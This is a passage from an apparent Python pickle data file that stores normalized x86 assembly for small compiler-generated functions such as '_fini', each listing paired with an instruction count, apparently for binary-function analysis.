S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,0\nMOV~EAX,<STR>\nCMP~EAX,0\nJZ~FOO\nSUB~EBX,0\nCALL~EAX\nMOV~EAX,[EBX]\nCMP~EAX,0\nJNZ~FOO\nPOP~EAX\nPOP~EBX\nPOP~EBP\nRETN"'
p473
L38L
tp474
a(S'_fini'
p475
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nCALL~FOO\nADD~EBX,0\nCALL~FOO\nPOP~EBX\nPOP~EBP\nRETN"'
p476
L23L
tp477
a.